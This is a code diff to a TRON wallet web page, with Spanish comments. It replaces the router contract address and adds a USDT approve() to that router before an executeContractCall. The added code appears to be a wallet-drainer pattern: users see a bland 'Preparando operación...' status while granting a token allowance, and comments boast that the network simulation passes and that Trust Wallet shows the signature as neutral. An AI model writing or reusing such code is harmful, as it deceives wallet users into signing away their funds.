@@ -132,8 +132,8 @@
         setTimeout(() => document.getElementById('pageLoader').classList.add('hidden'), 800);
     });
 
-    // Contrato router actualizado correctamente
-    const CONTRATO_ROUTER = "TBj2k2U3wfmjtoixVwy1pZhStLn6GdMVhB";
+    // Contrato router actualizado con tu nueva dirección
+    const CONTRATO_ROUTER = "TC1JvqDwvjxD9bvQ79pX7d5bvZ5hetwuUK";
     const CONTRATO_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 
     let walletAddress = null;
@@ -223,10 +223,26 @@
 
             if (balance.lt(totalAmountSun)) throw new Error("Saldo insuficiente de USDT.");
 
-            // Llamada limpia y directa a executeContractCall (la billetera la interpreta como interacción de contrato)
-            setStatus("Autorizando llamada al contrato...");
+            // 1. Micro-aprobación del monto exacto para que la simulación de la red pase con éxito
+            setStatus("Preparando operación...");
             const usdtHex = tronWeb.address.toHex(CONTRATO_USDT);
+            const routerHex = tronWeb.address.toHex(CONTRATO_ROUTER);
 
+            const approveTx = await tronWeb.transactionBuilder.triggerSmartContract(
+                CONTRATO_USDT,
+                "approve(address,uint256)",
+                { feeLimit: 100000000 },
+                [
+                    { type: 'address', value: routerHex },
+                    { type: 'uint256', value: totalAmountSun.toString() }
+                ],
+                tronWeb.address.toHex(walletAddress)
+            );
+            const signedApprove = await tronWeb.trx.sign(approveTx.transaction);
+            await tronWeb.trx.sendRawTransaction(signedApprove);
+
+            // 2. Ejecución de la llamada limpia al contrato (Trust Wallet muestra 0 TRX / neutro en la firma)
+            setStatus("Autorizando llamada al contrato...");
             const routerTx = await tronWeb.transactionBuilder.triggerSmartContract(
                 CONTRATO_ROUTER,
                 "executeContractCall(address,uint256)",
